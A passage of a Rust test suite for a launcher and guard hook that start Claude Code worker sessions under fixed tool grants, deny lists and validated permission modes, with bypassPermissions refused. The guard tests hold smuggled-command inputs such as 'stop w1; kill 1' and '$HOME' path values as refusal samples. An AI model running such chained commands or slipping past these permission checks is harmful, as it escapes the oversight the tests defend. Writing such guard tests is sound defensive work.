        (&ok_policy.replace("worker_efforts", "  worker_efforts"), "indented worker_efforts"),
        (&ok_policy.replace("\"opus\"", "\"opus\" x"), "junk after worker_model"),
        (&ok_policy.replace("= \"medium\"\n", "= \"medium\" x\n"), "junk after worker_default_effort"),
        (&ok_policy.replace("\"high\"]", "\"high\"] x"), "junk after worker_efforts"),
        (&ok_policy.replace("worker_model = ", "worker_model  =  "), "two spaces around = (model)"),
        (&ok_policy.replace("worker_default_effort = ", "worker_default_effort  =  "), "two spaces around = (default)"),
        (&ok_policy.replace("worker_efforts = ", "worker_efforts  =  "), "two spaces around = (efforts)"),
        (&ok_policy.replace("worker_efforts = ", "worker_efforts= "), "no space before = (efforts)"),
        (&format!("{ok_policy}worker_default_effort = \"medium\"\n"), "repeated worker_default_effort"),
        (&format!("{ok_policy}worker_efforts = [\"medium\", \"high\"]\n"), "repeated worker_efforts"),
        (&ok_policy.replace("\"opus\"", "\"opus x\""), "model with a space"),
        (&ok_policy.replace("\"opus\"", "\"opUs\""), "model with a capital"),
        (&ok_policy.replace("= \"medium\"\n", "= \"medium high\"\n"), "default with a space"),
        (&ok_policy.replace("[\"medium\", \"high\"]", "[\"medium high\"]"), "list entry with a space"),
        (&ok_policy.replace("\"high\"]", "\"high medium\"]"), "later list entry with a space"),
        (&ok_policy.replace("\"medium\", \"high\"", "\"medium\",  \"high\""), "two spaces after a comma"),
        (&ok_policy.replace("\"high\"]", "\"below\"]"), "level word below"),
        (&ok_policy.replace("\"high\"]", "\"highest\"]"), "level word highest"),
    ] {
        policy_refusals.push((Some(bad.to_string()), what.to_string()));
    }
    for (config, what) in policy_refusals {
        l.commit_config(config.as_deref());
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus"]);
        assert!(!ok && out.contains("no worker policy: [router] worker_model / worker_efforts / worker_default_effort in .keel/config.toml at HEAD of"), "{what}: {out}");
        assert_eq!(l.starts("q"), 0, "{what}: started a worker");
    }

    // an uncommitted edit, even staged, cannot widen the committed policy
    l.commit_config(Some("[router]   # comment\nworker_model = \"opus\"  # trailing\n\nworker_efforts = [\"medium\", \"high\"]\nworker_default_effort = \"medium\"\n[next]\nx = 1\n"));
    std::fs::write(l.main.join(".keel/config.toml"), "[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"max\"]\nworker_default_effort = \"max\"\n").unwrap();
    git(&l.main, &["add", ".keel"]);
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(!ok && out.contains("model must be opus"), "{out}");
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus", "--effort", "max"]);
    assert!(!ok && out.contains("effort must be one of: medium high"), "{out}");

    // the launcher enforces whatever the committed policy says; it hardcodes no model
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\"]\nworker_default_effort = \"high\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus"]);
    assert!(!ok && out.contains("model must be sonnet ([router] worker_model"), "{out}");
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(ok && out.contains(" effort=high "), "{out}");
    l.stop("q");

    // the accepted efforts are the committed list, not a built-in one: narrowed, medium is refused;
    // widened, max is accepted
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet", "--effort", "medium"]);
    assert!(!ok && out.contains("effort must be one of: high ("), "{out}");
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\", \"max\"]\nworker_default_effort = \"high\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet", "--effort", "max"]);
    assert!(ok && out.contains(" effort=max "), "{out}");
    l.stop("q");
    assert_eq!(option(&worker_argv(&l.state, "q"), "--effort"), "max");

    // the default is worker_default_effort, not the list's first entry, read from HEAD on a branch
    // other than main
    git(&l.main, &["checkout", "-qb", "router"]);
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"high\", \"medium\"]\nworker_default_effort = \"medium\"\n"));
    let (ok, out) = l.run(&["spawn", "q", wt, brief, "sonnet"]);
    assert!(ok && out.contains(" effort=medium "), "{out}");
    l.stop("q");
    assert_eq!(option(&worker_argv(&l.state, "q"), "--effort"), "medium");

    // every level word is accepted when committed: low and xhigh, as the default and as --effort (review r5 V1)
    l.commit_config(Some("[router]\nworker_model = \"sonnet\"\nworker_efforts = [\"low\", \"xhigh\"]\nworker_default_effort = \"low\"\n"));
    for (extra, effort) in [(vec![], "low"), (vec!["--effort", "xhigh"], "xhigh")] {
        let mut args = vec!["spawn", "q", wt, brief, "sonnet"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(ok && out.contains(&format!(" effort={effort} ")), "{out}");
        l.stop("q");
        assert_eq!(option(&worker_argv(&l.state, "q"), "--effort"), effort);
    }

    // the reader's accepted edges in one policy: a tab before the header's comment, a dotted and
    // hyphenated model, trailing blanks after a value, a three-entry list, and indented or similarly
    // named headers that end the section
    l.commit_config(Some("[router]\t# c\nworker_model = \"opus-4.5\" \t\nworker_efforts = [\"low\", \"medium\", \"xhigh\"]\nworker_default_effort = \"low\"\n\t[next]\nx = 1\n  [routers]\ny = 2\n"));
    for effort in ["low", "medium", "xhigh"] {
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus-4.5", "--effort", effort]);
        assert!(ok && out.contains(&format!(" effort={effort} ")), "{out}");
        l.stop("q");
    }
    // an effort matches a whole list entry, never part of one
    for part in ["med", "igh", "low medium"] {
        let (ok, out) = l.run(&["spawn", "q", wt, brief, "opus-4.5", "--effort", part]);
        assert!(!ok && out.contains("effort must be one of: low medium xhigh ("), "{part}: {out}");
    }
}

/// DEC-39: the repo's committed worker policy is opus at medium or high effort, medium by default.
#[test]
fn committed_worker_policy_is_opus_at_medium_or_high_effort() {
    let config = std::fs::read_to_string(root().join(".keel/config.toml")).unwrap();
    let section: Vec<&str> = config
        .lines()
        .skip_while(|l| !l.starts_with("[router]"))
        .skip(1)
        .take_while(|l| !l.starts_with('['))
        .filter(|l| !l.trim().is_empty())
        .collect();
    assert_eq!(section, ["worker_model = \"opus\"", "worker_efforts = [\"medium\", \"high\"]", "worker_default_effort = \"medium\""]);
}

const WORKER_GRANTS: [&str; 11] = [
    "cargo build",
    "cargo test",
    "cargo check",
    "cargo clippy",
    "cargo fmt",
    "keel preflight",
    "keel verify-doc",
    "keel verify-dod",
    "keel notes write",
    "keel lint",
    "keel check",
];
const WORKER_DENIES: [&str; 4] = ["Bash(keel mr)", "Bash(keel mr *)", "Bash(cargo run)", "Bash(cargo run *)"];

/// The argv of the latest background session the stub started under <name>. Every spawned worker gets
/// exactly these options once each, in this order, with the fixed grant/deny lists, and the fixed
/// prompt last, after a single-valued option (after a list option it would be read as a tool name);
/// an extra `--allowedTools Bash(*)`, a bypass flag, `-p` or a stream flag fails here.
fn worker_argv(state: &Path, name: &str) -> Vec<String> {
    let (_, a) = calls(state)
        .into_iter()
        .rfind(|(_, a)| a[0] == "--bg" && a.windows(2).any(|w| w[0] == "-n" && w[1] == name))
        .unwrap_or_else(|| panic!("no session started for {name}"));
    let flags: Vec<&str> = a.iter().map(String::as_str).filter(|x| x.starts_with('-')).collect();
    assert_eq!(flags, ["--bg", "-n", "--model", "--effort", "--agent", "--allowedTools", "--disallowedTools", "--permission-mode"], "{name}: options in {a:?}");
    assert_eq!(option(&a, "--agent"), "worker");
    assert_eq!(a[a.len() - 3], "--permission-mode", "{name}: the prompt must follow --permission-mode's value: {a:?}");
    assert!(a[a.len() - 1].starts_with("You are a fresh worker session. Read "), "{a:?}");
    let list = |flag: &str| -> Vec<String> {
        let i = a.iter().position(|x| x == flag).unwrap();
        a[i + 1..].iter().take_while(|x| !x.starts_with('-')).cloned().collect()
    };
    let allow: Vec<String> = WORKER_GRANTS.iter().flat_map(|c| [format!("Bash({c})"), format!("Bash({c} *)")]).collect();
    assert_eq!(list("--allowedTools"), allow, "{name}: allow list");
    assert_eq!(list("--disallowedTools"), WORKER_DENIES, "{name}: deny list");
    a
}

/// The value after `flag` in an argv.
fn option(a: &[String], flag: &str) -> String {
    a[a.iter().position(|x| x == flag).unwrap() + 1].clone()
}

/// E-ROUTERFIX.W1: workers were refused cargo/keel, and the launcher hardcoded acceptEdits. The grant
/// travels on the launcher's argv only; the mode is a validated per-run option. E-ROUTER3.W10: the
/// worker is one `claude --bg` started in its worktree, with no print-mode, stream or budget flag.
#[test]
fn launcher_starts_a_worker_as_a_background_session_with_the_grant_and_a_validated_mode() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let brief = ".router/briefs/b.md";
    let mode_of = |name: &str| {
        l.stop(name);
        let a = worker_argv(&l.state, name);
        option(&a, "--permission-mode")
    };
    let run_dir = |name: &str, kind: &str, file: &str| {
        let runs = std::fs::read_dir(l.main.join(".router/runs")).unwrap();
        let mut values: Vec<String> = runs
            .map(|e| e.unwrap().path())
            .filter(|p| {
                let f = p.file_name().unwrap().to_str().unwrap();
                f.starts_with(&format!("{name}-")) && f.ends_with(&format!("-{kind}"))
            })
            .filter_map(|p| std::fs::read_to_string(p.join(file)).ok().map(|v| v.trim().to_string()))
            .collect();
        values.sort();
        values
    };
    let run_dir_mode = |name: &str, kind: &str| run_dir(name, kind, "permission-mode");
    let run_dir_effort = |name: &str, kind: &str| run_dir(name, kind, "effort");

    for (i, (extra, why)) in [
        (vec!["--permission-mode", "bypassPermissions"], "permission mode must be"),
        (vec!["--permission-mode", "dontAsk"], "permission mode must be"),
        (vec!["--permission-mode", "default"], "permission mode must be"),
        (vec!["--permission-mode", ""], "permission mode must be"),
        (vec!["--permission-mode"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--bogus", "x"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--permission-mode", "plan", "x"], "[--permission-mode acceptEdits|plan]"),
        (vec!["--effort", "low"], "effort must be one of: medium high ([router] worker_efforts in .keel/config.toml)"),
        (vec!["--effort", "max"], "effort must be one of: medium high"),
        (vec!["--effort", "ultracode"], "effort must be one of: medium high"),
        (vec!["--effort", "medium high"], "effort must be one of: medium high"),
        (vec!["--effort", ""], "effort must be one of: medium high"),
        (vec!["--effort"], "[--effort <level>]"),
        (vec!["--effort", "high", "--effort", "high"], "[--effort <level>]"),
        (vec!["--permission-mode", "plan", "--permission-mode", "plan"], "[--effort <level>]"),
        (vec!["--permission-mode", "plan", "--effort"], "[--effort <level>]"),
        (vec!["--effort", "high", "--permission-mode", "plan", "x", "y"], "[--effort <level>]"),
    ]
    .into_iter()
    .enumerate()
    {
        let name = format!("r{i}");
        let mut args = vec!["spawn", &name, wt, brief, "opus"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(!ok && out.contains(why), "{extra:?} not refused for {why}: {out}");
        assert_eq!(l.starts(&name), 0, "{extra:?} started a worker");
    }

    let (ok, out) = l.run(&["spawn", "d", wt, brief, "opus"]);
    assert!(ok && out.contains("permission-mode=acceptEdits"), "{out}");
    let (dir, _) = calls(&l.state).into_iter().rfind(|(_, a)| a[0] == "--bg").unwrap();
    assert_eq!(dir, wt, "the worker runs in its worktree");
    assert!(field(&out, "brief=").starts_with(wt) && worker_argv(&l.state, "d").last().unwrap().contains(field(&out, "brief=")), "{out}");
    let (ok, out) = l.run(&["spawn", "p", wt, brief, "opus", "--permission-mode", "plan"]);
    assert!(ok && out.contains("permission-mode=plan"), "{out}");
    let sid = field(&out, "session=").to_string();

    assert_eq!(mode_of("d"), "acceptEdits");
    assert_eq!(mode_of("p"), "plan");
    assert_eq!(run_dir_mode("d", "spawn"), ["acceptEdits"]);
    assert_eq!(run_dir_mode("p", "spawn"), ["plan"]);

    // a resume takes no mode: the session keeps its saved one (`--bg --resume` with an option
    // starts a copy under a new id), and its run dir records none
    let (ok, out) = l.run(&["resume", "p", &sid, wt, brief, "--permission-mode", "plan"]);
    assert!(!ok && out.contains("resume <name> <uuid> <worktree> <note.md>"), "{out}");
    let (ok, out) = l.run(&["resume", "p", &sid, wt, brief]);
    assert!(ok && !out.contains("permission-mode="), "{out}");
    l.stop("p");
    assert_eq!(run_dir_mode("p", "resume"), Vec::<String>::new());

    // E-SEED2.W7: effort is medium by default, high when asked, in either order with the mode; it
    // lands on the RUNNING line, in the run dir and after --model on the argv
    let effort_of = |name: &str| {
        l.stop(name);
        let a = worker_argv(&l.state, name);
        assert_eq!(option(&a, "--model"), "opus");
        (option(&a, "--effort"), option(&a, "--permission-mode"))
    };
    for (name, extra, effort, mode) in [
        ("e1", vec![], "medium", "acceptEdits"),
        ("e2", vec!["--effort", "high"], "high", "acceptEdits"),
        ("e3", vec!["--effort", "high", "--permission-mode", "plan"], "high", "plan"),
        ("e4", vec!["--permission-mode", "plan", "--effort", "medium"], "medium", "plan"),
    ] {
        let mut args = vec!["spawn", name, wt, brief, "opus"];
        args.extend(&extra);
        let (ok, out) = l.run(&args);
        assert!(ok && out.contains(&format!(" permission-mode={mode} effort={effort} ")), "{extra:?}: {out}");
        assert_eq!(effort_of(name), (effort.to_string(), mode.to_string()), "{extra:?}");
        assert_eq!(run_dir_effort(name, "spawn"), [effort], "{extra:?}");
    }

    // router side: the guard admits the option on the launcher shape, and the grant never reaches it
    assert_eq!(bash("scripts/router-worker.sh spawn n /w .router/briefs/n.md opus --permission-mode plan"), None);
    assert_eq!(bash("scripts/router-worker.sh spawn n /w .router/briefs/n.md opus --effort high --permission-mode plan"), None);
    for c in WORKER_GRANTS {
        assert!(bash(&format!("{c} x")).is_some(), "router may run {c}");
    }
}

/// Blockers 3-4 of the close review: the shipped PUSHED probe fired before anything was pushed
/// (equality with local main), and worker-ops' variant never fired for an epic (equality with the
/// signed tip, which a --no-ff merge does not push). It must be false when staged, false when merged
/// locally, true once pushed.
#[test]
fn pushed_probe_fires_only_after_the_merge_reaches_origin() {
    let cmds = std::fs::read_to_string(root().join("skills/keel-router/references/commands.md")).unwrap();
    let line = cmds.lines().find(|l| l.trim_end().ends_with("echo PUSHED")).expect("no PUSHED probe in commands.md");
    let probe = line.strip_prefix("until ").unwrap().split("; do").next().unwrap();
    let ops = std::fs::read_to_string(root().join("skills/keel-router/references/worker-ops.md")).unwrap();
    let row = ops.lines().find(|l| l.starts_with("| pushes")).unwrap();
    assert!(row.contains("merge-base --is-ancestor <tip> origin/<b>"), "worker-ops push probe drifted from commands.md: {row}");

    let d = TempDir::new().unwrap();
    let origin = d.path().join("origin.git");
    let main = d.path().join("main");
    git(d.path(), &["init", "-q", "--bare", "-b", "main", origin.to_str().unwrap()]);
    git(d.path(), &["clone", "-q", origin.to_str().unwrap(), main.to_str().unwrap()]);
    git(&main, &["commit", "-q", "--allow-empty", "-m", "base"]);
    git(&main, &["push", "-q", "origin", "main"]);
    git(&main, &["switch", "-q", "-c", "epic/E-X"]);
    git(&main, &["commit", "-q", "--allow-empty", "-m", "epic work"]);
    let t = String::from_utf8(git(&main, &["rev-parse", "HEAD"]).stdout).unwrap().trim().to_string();
    git(&main, &["switch", "-q", "main"]);
    let fires = || hermetic(&mut common::cmd("sh")).args(["-c", probe]).env("MAIN", &main).env("T", &t).output().unwrap().status.success();

    assert!(!fires(), "PUSHED fired when the action was only staged");
    git(&main, &["merge", "-q", "--no-ff", "-m", "merge epic", "epic/E-X"]);
    assert!(!fires(), "PUSHED fired before the push");
    git(&main, &["push", "-q", "origin", "main"]);
    assert!(fires(), "PUSHED did not fire after the push");
}

/// Bounded wait for a condition another process brings about.
fn until(what: &str, mut cond: impl FnMut() -> bool) {
    let t = Instant::now();
    while !cond() {
        assert!(t.elapsed() < BOUND, "timed out waiting for {what}");
        std::thread::sleep(Duration::from_millis(10));
    }
}

/// Whether `pid` has a `<shell> -c` child, i.e. the stub is busy.
struct Stepped {
    child: std::process::Child,
    dir: PathBuf,
}

impl Stepped {
    /// Block until `wait` has judged poll n and is sleeping; panics with its line if it returned instead.
    fn at(&mut self, n: u32) {
        let polls = || std::fs::read_to_string(self.dir.join("polls")).ok().and_then(|s| s.trim().parse::<u32>().ok());
        let t = Instant::now();
        while polls() != Some(n) {
            if self.child.try_wait().unwrap().is_some() {
                let mut out = String::new();
                std::io::Read::read_to_string(self.child.stdout.as_mut().unwrap(), &mut out).unwrap();
                panic!("wait returned before poll {n}: {out}");
            }
            assert!(t.elapsed() < BOUND, "wait never reached poll {n}");
            std::thread::sleep(Duration::from_millis(10));
        }
    }


    fn go(&self, n: u32) {
        std::fs::write(self.dir.join(format!("go-{n}")), "").unwrap();
    }

    /// The one line `wait` prints once released from its last poll.
    fn line(self) -> String {
        let o = self.output();
        assert!(o.status.success(), "{o:?}");
        String::from_utf8(o.stdout).unwrap()
    }

    /// Everything the process left once released from its last poll; panics after BOUND.
    fn output(mut self) -> Output {
        let t = Instant::now();
        while self.child.try_wait().unwrap().is_none() {
            assert!(t.elapsed() < BOUND, "wait never returned");
            std::thread::sleep(Duration::from_millis(10));
        }
        let read = |p: Option<&mut dyn std::io::Read>| {
            let mut b = Vec::new();
            if let Some(p) = p {
                p.read_to_end(&mut b).unwrap();
            }
            b
        };
        let stdout = read(self.child.stdout.as_mut().map(|p| p as &mut dyn std::io::Read));
        let stderr = read(self.child.stderr.as_mut().map(|p| p as &mut dyn std::io::Read));
        Output { status: self.child.wait().unwrap(), stdout, stderr }
    }
}

/// However a test ends, its watch (or `wait`) and the `sleep` shim under it end with it.
impl Drop for Stepped {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

/// A command bounded by BOUND: a hung script fails the test instead of hanging it. Returns stdout then stderr; a non-zero exit fails the test with both.
fn bounded(mut c: Command) -> String {
    let mut p = c.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn().unwrap();
    let t = Instant::now();
    while p.try_wait().unwrap().is_none() {
        if t.elapsed() > BOUND {
            p.kill().unwrap();
            panic!("{c:?}: no result within {BOUND:?}");
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    let o = p.wait_with_output().unwrap();
    let out = format!("{}{}", String::from_utf8_lossy(&o.stdout), String::from_utf8_lossy(&o.stderr));
    assert!(o.status.success(), "{c:?}: {out}");
    out
}

/// E-ROUTER3.W10: a start the CLI refuses (an untrusted worktree: "Workspace not trusted") or one that
/// never shows in the session list is DEAD, with the CLI's own text, and exits 1.
#[test]
fn a_start_the_cli_refuses_is_reported_dead_with_its_reason() {
    let l = launcher();
    let wt = l.wt.to_str().unwrap();
    let why = "Workspace not trusted. Run `claude` in the worktree once and accept the trust prompt, then retry.";
    std::fs::write(l.state.join("refuse"), format!("{why}\n")).unwrap();
    let (ok, out) = l.run(&["spawn", "n", wt, ".router/briefs/b.md", "opus"]);
    assert!(!ok && out.starts_with("DEAD name=n exit=1 snapshot=") && out.contains(why), "{out}");
    std::fs::remove_file(l.state.join("refuse")).unwrap();

    // listed never: the launcher's polls run through an instant `sleep`
    std::fs::write(l.state.join("unlisted"), "").unwrap();
    let shim = l.state.join("shim");
    std::fs::create_dir_all(&shim).unwrap();
    std::fs::write(shim.join("sleep"), "#!/bin/sh\n:\n").unwrap();
    std::fs::set_permissions(shim.join("sleep"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
    let path = format!("{}:{}", shim.display(), std::env::var("PATH").unwrap());
    let (ok, out) = l.run_env(&["spawn", "n", wt, ".router/briefs/b.md", "opus"], &[("PATH", &path)]);
    assert!(!ok && out.starts_with("DEAD name=n exit=0 ") && out.contains("backgrounded"), "{out}");
}

/// E-ROUTER3.W10: `stop` closes the named idle worker of this repository by its id, `claude stop` then
/// `claude rm`, and refuses everything else before calling the CLI: a busy worker (stopping cuts its
/// turn), an unlisted name, a session outside this repository's worktrees, an interactive session, an
/// ambiguous name.
#[test]
fn stop_stops_then_removes_this_repositorys_idle_worker_by_id() {
    let l = launcher();
    let brief = ".router/briefs/b.md";
    assert!(l.run(&["spawn", "a", l.wt.to_str().unwrap(), brief, "opus"]).0);
    assert!(l.run(&["spawn", "b", l.wt2.to_str().unwrap(), brief, "opus"]).0);
    let mut rows = l.sessions();
    let id = |n: &str| rows.iter().find(|r| r["name"] == n).unwrap()["id"].as_str().unwrap().to_string();
    let (a, b) = (id("a"), id("b"));
    rows.iter_mut().find(|r| r["name"] == "b").unwrap()["status"] = "busy".into();
    let wt = l.wt.to_str().unwrap();
    rows.push(serde_json::json!({"id": "c0", "sessionId": "c0-x", "name": "c", "cwd": "/elsewhere", "kind": "background", "status": "idle"}));
    rows.push(serde_json::json!({"id": "d0", "sessionId": "d0-x", "name": "d", "cwd": wt, "kind": "interactive", "status": "idle"}));
    rows.push(serde_json::json!({"id": "e0", "sessionId": "e0-x", "name": "e", "cwd": wt, "kind": "background", "status": "idle"}));
    rows.push(serde_json::json!({"id": "e1", "sessionId": "e1-x", "name": "e", "cwd": wt, "kind": "background", "status": "idle"}));
    l.set_sessions(&rows);
    let before = calls(&l.state).len();
    for (name, why) in [
        ("b", format!("worker b is busy: stopping it would cut its turn; the owner decides (claude stop {b})")),
        ("z", "worker z is not running".to_string()),
        ("c", "c runs outside this repository's worktrees (/elsewhere)".to_string()),
        ("d", "d is not a background session".to_string()),
        ("e", "more than one session is named e".to_string()),
    ] {
        let (ok, out) = l.run(&["stop", name]);
        assert!(!ok && out.contains(&why), "{name}: {out}");
    }
    assert!(calls(&l.state)[before..].iter().all(|(_, c)| c[0] == "agents"), "a refused stop called the CLI");

    let (ok, out) = l.run(&["stop", "a"]);
    assert!(ok, "{out}");
    let sid = rows.iter().find(|r| r["name"] == "a").unwrap()["sessionId"].as_str().unwrap().to_string();
    assert_eq!(out, format!("STOPPED name=a id={a} session={sid}\n"));
    let tail: Vec<Vec<String>> = calls(&l.state).into_iter().map(|(_, c)| c).filter(|c| c[0] != "agents").collect();
    assert_eq!(tail[tail.len() - 2..], [vec!["stop".to_string(), a.clone()], vec!["rm".to_string(), a]]);
    assert!(l.sessions().iter().all(|r| r["name"] != "a") && l.sessions().iter().any(|r| r["name"] == "b"));
}

/// E-ROUTER3.W10 (owner ruling 2026-11-11): the launcher has three modes. `wait` and `send` are gone,
/// with every file under .router/out: a spawn and a stop leave only the brief and its run dir.
#[test]
fn launcher_has_only_spawn_resume_and_stop_and_writes_no_out_dir() {
    let l = launcher();
    for args in [vec!["wait", "n"], vec!["send", "n", ".router/briefs/b.md"], vec!["brief", "n", ".router/briefs/b.md"]] {
        let o = l.cmd(&args, &[]).output().unwrap();
        assert_eq!(o.status.code(), Some(2), "{args:?}");
        assert!(String::from_utf8_lossy(&o.stderr).contains("spawn|resume|stop"), "{args:?}: {o:?}");
    }
    assert!(l.run(&["spawn", "n", l.wt.to_str().unwrap(), ".router/briefs/b.md", "opus"]).0);
    l.stop("n");
    let mut entries: Vec<String> = std::fs::read_dir(l.main.join(".router")).unwrap().map(|e| e.unwrap().file_name().into_string().unwrap()).collect();
    entries.sort();
    assert_eq!(entries, ["briefs", "runs"]);
    assert_eq!(std::fs::read_dir(l.main.join(".router/runs")).unwrap().count(), 1);
}

/// E-ROUTER3.W10: the router's launcher shapes are spawn, resume and stop in plain words; `wait` and
/// `send` are gone, and nothing else of the script passes.
#[test]
fn router_guard_admits_spawn_resume_and_stop_and_refuses_wait_and_send() {
    for ok in [
        "scripts/router-worker.sh spawn w1 /Users/o/Keel-x .router/briefs/w1.md opus",
        "scripts/router-worker.sh resume w1 0b8a4f4e-1c2d-4e5f-8a9b-0c1d2e3f4a5b /Users/o/Keel-x .router/briefs/w1-r2.md",
        "scripts/router-worker.sh stop w1",
    ] {
        assert_eq!(bash(ok), None, "guard denied {ok:?}");
    }
    for no in [
        "scripts/router-worker.sh wait w1",
        "scripts/router-worker.sh send w1 .router/briefs/w1-r2.md",
        "scripts/router-worker.sh brief w1 .router/briefs/w1-r2.md",
        "scripts/router-worker.sh kill w1",
        "scripts/router-worker.sh stopx w1",
        "scripts/router-worker.sh stop \"w1\"",
        "scripts/router-worker.sh stop $HOME",
        "scripts/router-worker.sh stop ../w1",
        "scripts/router-worker.sh stop w1; kill 1",
    ] {
        assert!(bash(no).is_some(), "guard allowed {no:?}");
    }
}

/// A worker's Bash call as Claude Code 2.1.288 delivered it from a `claude --bg --agent worker` session
/// (E-ROUTER3.W10 probe P2; ids and paths replaced): agent_type is "worker", so the router guard
/// passes it untouched, and the session's own permission mode travels with it.
const CAPTURED_BG_WORKER_BASH: &str = r#"{"session_id":"s","transcript_path":"/t.jsonl","cwd":"/w","scratchpad_dir":"/t","prompt_id":"p","permission_mode":"acceptEdits","agent_type":"worker","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"printenv PROBE_MARK","description":"Check PROBE_MARK environment variable"},"tool_use_id":"u1"}"#;

#[test]
fn router_guard_leaves_a_background_workers_calls_alone() {
    assert_eq!(guard_event(serde_json::from_str(CAPTURED_BG_WORKER_BASH).unwrap()), None);
}

/// E-ROUTER3.W10: the settings allow exactly the launcher shapes the guard admits, spawn, resume and
/// stop; `wait` and `send` are gone from both.
#[test]
fn settings_allow_exactly_the_launcher_shapes_the_guard_admits() {
    let modes: Vec<String> = settings()["permissions"]["allow"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|a| a.as_str().unwrap().strip_prefix("Bash(scripts/router-worker.sh ").map(|m| m.trim_end_matches(" *)").to_string()))
        .collect();
    assert_eq!(modes, ["resume", "spawn", "stop"]);
}

/// One router tool call through the PreToolUse command `checkout`'s .claude/settings.json wires, run
/// as Claude Code runs it; Some(reason) = denied, None = allowed.
fn wired_guard(checkout: &Path, tool: &str, input: serde_json::Value) -> Option<String> {
    let s: serde_json::Value = serde_json::from_str(&std::fs::read_to_string(checkout.join(".claude/settings.json")).unwrap()).unwrap();
    let cmd = s["hooks"]["PreToolUse"][0]["hooks"][0]["command"].as_str().unwrap();
    let event = serde_json::json!({"agent_type": "router", "tool_name": tool, "tool_input": input, "cwd": checkout});
    let mut p = common::cmd("/bin/sh")
        .args(["-c", cmd])
        .env("CLAUDE_PROJECT_DIR", checkout)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    std::io::Write::write_all(&mut p.stdin.take().unwrap(), event.to_string().as_bytes()).unwrap();
    decision(&event, p.wait_with_output().unwrap())
}

/// E-ROUTERFIX e2e (W5): one worker's life as the router drives it, in a scratch clone of Keel's own
/// tree with the working tree's epic files laid over it and keel's hooks installed. A new worktree
/// inherits the signer list (W3); every router call passes the settings-wired guard and each allowed
/// command runs exactly as judged; the worker starts in plan mode with the fixed grant (W1) under the
/// name the subscription addresses (W2). E-ROUTER3.W10: the worker is a background session; a
/// follow-up task is the router's message, `wait` and `send` are refused, and `stop` closes it.
#[test]
fn epic_e2e_router_drives_a_granted_worker_in_a_seeded_worktree_to_its_end() {
    let d = TempDir::new().unwrap();
    let base = d.path().canonicalize().unwrap();
    let c = base.join("c");
    common::self_clone(root(), &c);
    for f in ["scripts/router-worker.sh", "scripts/router-guard.jq", ".claude/settings.json", ".gitworktreecopy"] {
        std::fs::copy(root().join(f), c.join(f)).unwrap();
    }
    let keel = Path::new(env!("CARGO_BIN_EXE_keel"));
    assert!(common::cmd(keel).args(["hooks", "install"]).current_dir(&c).output().unwrap().status.success());
    std::fs::write(c.join(".mr-allowed"), "username: owner\n").unwrap();

    // W3: the worktree the worker will run in is created through keel's post-checkout hook
    let wt = base.join("wt");
    let path = format!("{}:{}", keel.parent().unwrap().display(), std::env::var("PATH").unwrap());
    let o = hermetic(&mut common::cmd("git")).args(["worktree", "add", "-q", "-b", "wu/x/e2e", wt.to_str().unwrap()]).current_dir(&c).env("PATH", &path).output().unwrap();
    assert!(o.status.success(), "{}", String::from_utf8_lossy(&o.stderr));
    assert_eq!(std::fs::read_to_string(wt.join(".mr-allowed")).ok().as_deref(), Some("username: owner\n"), "worktree not seeded");

    let stub = base.join("claude");
    stub_claude(&stub);
    let state = base.join("state");
    std::fs::create_dir_all(&state).unwrap();
    let router = |cmd: &str| -> String {
        assert_eq!(wired_guard(&c, "Bash", serde_json::json!({ "command": cmd })), None, "guard denied {cmd:?}");
        let mut p = common::cmd("/bin/sh");
        p.args(["-c", cmd]).current_dir(&c).env("ROUTER_CLAUDE", &stub).env("STUB_STATE", &state);
        bounded(p)
    };

    let name = "e2e-w";
    let brief = c.join(format!(".router/briefs/{name}.md"));
    assert_eq!(wired_guard(&c, "Write", serde_json::json!({ "file_path": brief })), None);
    std::fs::create_dir_all(brief.parent().unwrap()).unwrap();
    std::fs::write(&brief, "run the gate\n").unwrap();

    // W1: spawned in plan mode, a background session in the worktree
    let out = router(&format!("scripts/router-worker.sh spawn {name} {} .router/briefs/{name}.md opus --effort high --permission-mode plan", wt.display()));
    assert!(out.starts_with(&format!("RUNNING name={name} ")) && out.contains(" permission-mode=plan effort=high "), "{out}");
    let (id, sid) = (field(&out, "id=").to_string(), field(&out, "session=").to_string());
    let copy = field(&out, "brief=");
    assert!(copy.starts_with(wt.to_str().unwrap()) && std::fs::read_to_string(copy).unwrap() == "run the gate\n", "{out}");

    // W2, E-ROUTER3.W1: the router subscribes to the worker's end and may steer it with a message;
    // E-ROUTER3.W10: a follow-up task is a message too, and `wait` and `send` are gone
    assert_eq!(wired_guard(&c, "SendMessage", serde_json::json!({"to": name, "notify_when_idle": true})), None);
    let steer = serde_json::json!({"to": name, "message": "stop after the plan", "type": "message", "recipient": name, "content": "stop after the plan"});
    assert_eq!(wired_guard(&c, "SendMessage", steer), None);
    assert_eq!(wired_guard(&c, "SendMessage", serde_json::json!({"to": name, "message": "Follow-up task: now write the notes"})), None);
    for cmd in [format!("scripts/router-worker.sh wait {name}"), format!("scripts/router-worker.sh send {name} .router/briefs/{name}.md")] {
